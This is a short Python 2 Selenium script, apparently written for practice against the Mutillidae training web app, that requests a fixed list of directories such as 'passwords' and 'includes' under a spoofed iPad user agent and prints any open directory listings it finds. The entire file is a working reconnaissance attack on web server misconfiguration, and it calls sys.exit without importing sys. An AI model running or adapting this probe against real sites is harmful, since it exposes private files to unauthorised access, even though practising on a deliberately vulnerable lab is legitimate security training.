#!/usr/bin/env python

from selenium import webdriver
from bs4 import BeautifulSoup
import time
import optparse

class SecurityMisconfigurationAttack():
	dirs = ["xxxx", "includes", "owasp-esapi-php", "documentation", "passwords"]

	def __init__(self, url):
		self.url = url		
		try:	
			useragent = "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25"
			profile = webdriver.FirefoxProfile()
			profile.set_preference("general.useragent.override",useragent)
			self.browser = webdriver.Firefox(profile)
		except Exception, e:
			print " [!] Browser object creation error:", e

	def __wait(self):
		time.sleep(2)

	def close(self):
		self.browser.close()
		
	def attack(self):
		if self.browser == None:
			return
		try:	
			for dir in SecurityMisconfigurationAttack.dirs:

				print " [-] Trying to list dir at '%s'\n"%(self.url+"/"+dir)
				self.browser.get(self.url+"/"+dir)
				self.__wait()

				page_src = self.browser.page_source
			
				if page_src.find("Index of") == -1:
					print " [!] Can not list directory '%s'\n"%dir
					continue
				
				print " [*] Directory listing:"
				soup = BeautifulSoup(page_src, "lxml")
				for li in soup.find_all("li"):
					print "\t[+] "+li.string
				print "\n"
		except Exception, e:
			print " [!] Attack was not successfull, error:", e
			
def main():
	parser = optparse.OptionParser("Usage: %prog -u <url> or %prog --url=<url>")
	parser.add_option("-u", "--url", dest="url", help="mutillidae home")
	options, args = parser.parse_args()
	if options.url == None:
		parser.print_help()
		sys.exit(0)
	
	attacker = SecurityMisconfigurationAttack(options.url)
	attacker.attack()
	attacker.close()

if __name__ == "__main__":
	main()				
